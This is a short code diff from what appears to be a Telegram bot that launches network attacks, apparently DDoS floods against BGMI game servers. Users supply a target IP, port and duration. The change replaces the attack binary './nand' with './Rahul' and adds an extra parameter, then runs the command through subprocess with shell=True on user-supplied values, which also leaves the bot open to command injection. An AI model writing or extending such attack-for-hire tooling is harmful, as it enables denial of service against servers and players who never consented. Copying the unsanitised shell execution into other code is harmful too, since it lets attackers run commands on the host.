@@ -397,7 +397,7 @@ def handle_bgmi1(message):
                 record_command_logs(user_id, '/bgmi1', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./nand {target} {port} {time}"
+                full_command = f"./Rahul {target} {port} {time} 900"
                 process = subprocess.run(full_command, shell=True)
 
                 # Remove from ongoing attacks once the attack completes
